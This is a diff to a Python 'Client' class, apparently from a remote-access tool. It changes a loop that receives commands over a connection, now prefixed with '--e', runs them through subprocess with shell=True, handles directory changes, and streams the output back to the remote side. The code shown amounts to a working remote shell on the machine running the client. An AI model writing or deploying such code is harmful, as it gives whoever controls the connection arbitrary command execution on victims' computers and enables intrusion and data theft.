@@ -412,45 +412,46 @@ class Client(object):
                 self.send(os.getcwdb())
                 continue
 
-            if data[0] == 'cd':
-                self.send(os.getcwdb())
-                continue
+            if data[0] == '--e':
+                if data[1] == 'cd':
+                    self.send(os.getcwdb())
+                    continue
 
-            if data[0][:2].lower() == 'cd' or data[0][:5] == 'chdir':
-                if platform.system() == 'Windows':
-                    _pwd = ' & cd'
-                else:
-                    _pwd = '; pwd'
-                process = subprocess.Popen(data[0] + _pwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                error = process.stderr.read().decode()
-                if error == "":
-                    output = process.stdout.read().decode()
-                    newlines = output.count('\n')
-                    if newlines > 1:
-                        process = subprocess.Popen(data[0], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                        self.send(json.dumps(['<ERROR>', process.stdout.read().decode()]).encode())
+                if data[1][:2].lower() == 'cd' or data[1][:5] == 'chdir':
+                    if platform.system() == 'Windows':
+                        _pwd = ' & cd'
                     else:
-                        os.chdir(output.replace('\n', '').replace('\r', ''))
-                        self.send(json.dumps([os.getcwd()]).encode())
-                else:
-                    self.send(json.dumps(['<ERROR>', error]).encode())
-                continue
+                        _pwd = '; pwd'
+                    process = subprocess.Popen(data[1] + _pwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    error = process.stderr.read().decode()
+                    if error == "":
+                        output = process.stdout.read().decode()
+                        newlines = output.count('\n')
+                        if newlines > 1:
+                            process = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            self.send(json.dumps(['<ERROR>', process.stdout.read().decode()]).encode())
+                        else:
+                            os.chdir(output.replace('\n', '').replace('\r', ''))
+                            self.send(json.dumps([os.getcwd()]).encode())
+                    else:
+                        self.send(json.dumps(['<ERROR>', error]).encode())
+                    continue
 
-            if len(data[0]) > 0:
-                if data[0] == 'tree':
-                    data[0] = 'tree /A'
-                process = subprocess.Popen(data[0], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                for line in iter(process.stdout.readline, ""):
-                    if line == b'':
-                        break
-                    self.send(line.replace(b'\n', b''))
-                    if self.receive() == '--q':
-                        kill(process.pid)
-                        break
-                self.send(process.stderr.read())
-                self.receive()
-                self.send(b'<DONE>')
-                continue
+                if len(data[1]) > 0:
+                    if data[1] == 'tree':
+                        data[1] = 'tree /A'
+                    process = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    for line in iter(process.stdout.readline, ""):
+                        if line == b'':
+                            break
+                        self.send(line.replace(b'\n', b''))
+                        if self.receive() == '--q':
+                            kill(process.pid)
+                            break
+                    self.send(process.stderr.read())
+                    self.receive()
+                    self.send(b'<DONE>')
+                    continue
 
 
 def main():
